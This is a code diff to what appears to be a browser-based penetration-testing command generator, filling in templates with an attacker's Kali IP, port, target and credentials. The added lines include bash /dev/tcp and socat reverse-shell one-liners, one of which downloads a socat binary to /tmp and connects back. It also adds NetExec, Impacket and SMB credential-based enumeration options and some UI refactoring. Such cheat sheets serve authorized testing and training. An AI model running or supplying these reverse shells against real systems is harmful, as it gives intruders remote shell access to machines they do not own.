+          { prefix: "", template: "setsid bash -c 'bash -i >& /dev/tcp/{kaliIp}/{port} 0>&1' &" },
+          { prefix: "Explicitly ignore SIGHUP", template: "nohup bash -c 'bash -i >& /dev/tcp/{kaliIp}/{port} 0>&1' &" }
+        ]
+      },
+      {
+        id: "PTY",
+        title: "PTY",
+        nav: "PTY",
+        group: "Reverse shell",
+        commands: [
+          { template: "python -c 'import pty; pty.spawn(\"/bin/bash\")' && export TERM=xterm-256color" },
+          { template: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' && export TERM=xterm-256color" },
+          { prefix: "Socat listener", template: "socat file:`tty`,raw,echo=0 TCP-LISTEN:{port}" },
+          { prefix: "Socat reverse shell", template: "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{kaliIp}:{port}" },
+          { prefix: "Download and execute socat reverse shell", template: "wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{kaliIp}:{port}" },
+          { prefix: "Background session", template: "Ctrl+Z" },
+          { prefix: "Pass key stroke directly to shell", template: "stty raw -echo" },
+          { prefix: "foreground session", template: "fg" },
+          { prefix: "Terminal size (stty size)", template: "stty rows 40 columns 120" }
         ]
       },
       {
@@ -1089,7 +1245,21 @@ admin</textarea>
         commands: [
           { template: "python3 -m venv venv" },
           { template: "source venv/bin/activate" },
-          { template: "pip install uploadserver" }
+          { template: "pip install uploadserver" },
+          { template: "pip install -r requirements.txt" }
+        ]
+      },
+      {
+        id: "python2-venv",
+        title: "Python2 virtual environment",
+        nav: "Python2 virtual environment",
+        commands: [
+          { prefix: "Install pip for Python 2", template: "curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py && python2.7 get-pip.py" },
+          { prefix: "Install virtualenv package", template: "python2.7 -m pip install \"virtualenv<20\"" },
+          { prefix: "Create environment", template: "python2.7 -m virtualenv venv2" },
+          { prefix: "Activate", template: "source venv2/bin/activate" },
+          { prefix: "Install packages", template: "pip install pysmb" },
+          { prefix: "Install packages without venv", template: "python2.7 -m pip install --user pysmb" }
         ]
       },
       {
@@ -1299,6 +1469,26 @@ admin</textarea>
             </label>`;
         }
 
+        if (option.type === "combo") {
+          const choices = (option.choices || []).map(choice => {
+            const value = typeof choice === "string" ? choice : choice.value;
+            const text = typeof choice === "string" ? choice : (choice.label || choice.value);
+            return `<div class="combo-option" data-value="${escapeHtml(value)}">${escapeHtml(text)}</div>`;
+          }).join("");
+          const value = option.defaultValue !== undefined ? escapeHtml(option.defaultValue) : "";
+          const placeholder = option.placeholder !== undefined ? escapeHtml(option.placeholder) : "";
+
+          return `
+            <label class="section-option" for="${optionId}">
+              <span>${label}</span>
+              <div class="combo">
+                <input id="${optionId}" type="text" value="${value}" placeholder="${placeholder}" autocomplete="off" data-section-option="${escapeHtml(option.id)}" />
+                <button type="button" class="combo-toggle" aria-label="Show ${label} options"></button>
+                <div class="combo-menu">${choices}</div>
+              </div>
+            </label>`;
+        }
+
         if (option.type === "text") {
           const value = option.defaultValue !== undefined ? escapeHtml(option.defaultValue) : "";
           const placeholder = option.placeholder !== undefined ? escapeHtml(option.placeholder) : "";
@@ -1353,6 +1543,18 @@ admin</textarea>
     function optionValue(optionId, fallback) {
       const element = document.getElementById(optionElementId(optionId));
       return element ? element.value : fallback;
+    }
+
+    function domainToBaseDn(domain) {
+      const labels = domain
+        .trim()
+        .split(".")
+        .map(label => label.trim())
+        .filter(Boolean);
+
+      return labels.length > 0
+        ? labels.map(label => `dc=${label}`).join(",")
+        : "<base_dn>";
     }
 
     function cleanUrlPath(path) {
@@ -1418,18 +1620,45 @@ admin</textarea>
       values.hydraPortFlag = optionChecked("hydraPort") ? ` -s ${values.port}` : "";
       values.rdpDomainFlag = optionChecked("rdpDomain") ? ` /d:${values.domain}` : "";
       values.nxcPortFlag = optionChecked("nxcPort") ? ` --port ${values.port}` : "";
-      values.nxcLocalAuthFlag = optionChecked("nxcLocalAuth") ? " --local-auth" : "";
       values.nxcCommandExecFlag = optionChecked("nxcCommandExec") ? " -X 'powershell -e '" : "";
+      values.nxcFlags = [
+        optionChecked("nxcLocalAuth") ? " --local-auth" : "",
+        optionChecked("nobruteforce") ? " --no-bruteforce" : "",
+        optionChecked("nxcUsers") ? " --users" : "",
+        optionChecked("nxcGroups") ? " --groups" : "",
+        optionChecked("nxcComputers") ? " --computers" : "",
+        optionChecked("nxcShares") ? " --shares" : "",
+        optionChecked("nxcLoggedOnUsers") ? " --loggedon-users" : "",
+        optionChecked("nxcPassPol") ? " --pass-pol" : ""
+      ].join("");
       values.nxcCredFileFlag = nxcAuthMode === "hash" ? " -H hashes.txt" : " -p passwords.txt";
       values.nxcCredSingleFlag = nxcAuthMode === "hash" ? ` -H '${values.hash}'` : ` -p '${values.password}'`;
       values.impacketHashFlag = impacketAuthMode === "hash" ? ` -hashes :${values.hash}` : "";
       values.impacketPwFlag = impacketAuthMode === "hash" ? "" : `:'${values.password}'`;
+
+      const impacketUseTicket = optionChecked("impacketUseTicket");
+      values.impacketRemoteAuthFlag = impacketUseTicket
+        ? ` -k -no-pass -target-ip ${values.target}`
+        : values.impacketHashFlag;
+      values.impacketRemoteTarget = impacketUseTicket
+        ? `'${values.domain}/${values.user}@${values.hostname}.${values.domain}'`
+        : `${values.domainShort}/${values.user}${values.impacketPwFlag}@${values.target}`;
+      values.impacketDirectoryAuthFlag = impacketUseTicket
+        ? " -k -no-pass"
+        : values.impacketHashFlag;
+      values.impacketDirectoryTarget = impacketUseTicket
+        ? `${values.domain}/${values.user}`
+        : `${values.domain}/${values.user}${values.impacketPwFlag}`;
+      values.ldapBaseDn = domainToBaseDn(values.domain);
       values.smbAuth = optionChecked("smbUseDomain")
         ? `${values.domainShort}\\${values.user}%${values.password}`
         : `${values.user}%${values.password}`;
       values.smbAuthOption = optionChecked("smbNullAuth")
         ? "-N"
         : `-U '${values.smbAuth}'`;
+      values.smbMountAuthOption = optionChecked("smbNullAuth")
+        ? "guest,"
+        : `username=${values.user},password='${values.password}',domain=${values.domainShort},`;
       values.rpcAuthOption = optionChecked("rpcNullAuth")
         ? `-U "" -N`
         : `-U '${values.smbAuth}'`;
@@ -1448,6 +1677,12 @@ admin</textarea>
       values.gobusterOutputSuffix = gobusterOutputParts.length > 0 ? `_${gobusterOutputParts.join("_")}` : "";
       values.gobusterWordlist = optionValue("gobusterWordlist", "/usr/share/wordlists/dirb/common.txt").trim() || "/usr/share/wordlists/dirb/common.txt";
       values.gobusterProxyFlag = optionChecked("gobusterProxy") ? " --proxy socks5://127.0.0.1:9999" : "";
+      values.gobusterExcludeLengthFlag = optionChecked("gobusterExcludeLength")
+        ? ` --exclude-length ${optionValue("gobusterExcludeLengthValue", "").trim() || "<length>"}`
+        : "";
+      values.gobusterTlsFlag = optionChecked("gobusterTls") ? " -k" : "";
+      values.gobusterProtocol = optionChecked("gobusterTls") ? "https" : "http";
+      values.ftpTlsFlag = optionChecked("ftpTls") ? " -e 'set ssl:verify-certificate no'" : "";
       values.webPagePortFlag = optionChecked("webPagePort") ? `:${values.port}` : "";
       const sqlAnonymous = optionChecked("sqlAnonymous");
       values.sqlMysqlAuth = sqlAnonymous
@@ -1455,7 +1690,7 @@ admin</textarea>
         : `-u '${values.user}' -p'${values.password}'`;
       values.sqlMssqlTarget = sqlAnonymous
         ? values.target
-        : `${values.domainShort}/${values.user}:'${values.password}'@${values.target}`;
+        : `${values.domain}/${values.user}:'${values.password}'@${values.target}`;
       values.sqlMssqlCliAuth = sqlAnonymous
         ? ""
         : ` -U '${values.user}' -P '${values.password}'`;
@@ -1467,7 +1702,6 @@ admin</textarea>
         : ` -U '${values.user}'`;
       values.hashcatModule = optionValue("hashcatModule", "1000");
       values.smbShare = optionValue("smbShare", "SYSVOL");
-      values.msfvenomFileType = optionValue("msfvenomFileType", "exe");
       values.downloadPortFlag = optionChecked("downloadPort") ? `:${values.port}` : "";
 
       return values;
@@ -1494,31 +1728,49 @@ admin</textarea>
       saveState();
     }
 
-    function setupFilenameCombo() {
-      const combo = document.getElementById("filenameCombo");
-      const input = document.getElementById("filenameSelect");
-      const button = document.getElementById("filenameDropdownButton");
-      const menu = document.getElementById("filenameMenu");
-
-      button.addEventListener("click", event => {
-        event.stopPropagation();
-        menu.classList.toggle("open");
-      });
-
-      menu.querySelectorAll(".combo-option").forEach(option => {
-        option.addEventListener("click", () => {
-          input.value = option.dataset.value;
-          menu.classList.remove("open");
-          updateCommands();
-        });
-      });
-
-      input.addEventListener("focus", () => {
-        menu.classList.remove("open");
-      });
-
+    function setupComboWidgets() {
       document.addEventListener("click", event => {
-        if (!combo.contains(event.target)) {
+        const toggle = event.target.closest(".combo-toggle");
+        if (toggle) {
+          event.stopPropagation();
+          const combo = toggle.closest(".combo");
+          const menu = combo ? combo.querySelector(".combo-menu") : null;
+          if (!menu) {
+            return;
+          }
+          const wasOpen = menu.classList.contains("open");
+          document.querySelectorAll(".combo-menu.open").forEach(openMenu => openMenu.classList.remove("open"));
+          if (!wasOpen) {
+            menu.classList.add("open");
+          }
+          return;
+        }
+
+        const option = event.target.closest(".combo-option");
+        if (option) {
+          const combo = option.closest(".combo");
+          const input = combo ? combo.querySelector("input") : null;
+          const menu = option.closest(".combo-menu");
+          if (input) {
+            input.value = option.dataset.value;
+            updateCommands();
+          }
+          if (menu) {
+            menu.classList.remove("open");
+          }
+          return;
+        }
+
+        document.querySelectorAll(".combo-menu.open").forEach(openMenu => openMenu.classList.remove("open"));
+      });
+
+      document.addEventListener("focusin", event => {
+        if (!event.target.matches(".combo input")) {
+          return;
+        }
+        const combo = event.target.closest(".combo");
+        const menu = combo ? combo.querySelector(".combo-menu") : null;
+        if (menu) {
           menu.classList.remove("open");
         }
       });
@@ -1661,7 +1913,7 @@ admin</textarea>
       renderCommandSections();
       loadState();
       bindEvents();
-      setupFilenameCombo();
+      setupComboWidgets();
       updateEdgeNavPosition();
       window.addEventListener("scroll", updateEdgeNavPosition, { passive: true });
       window.addEventListener("resize", updateEdgeNavPosition);
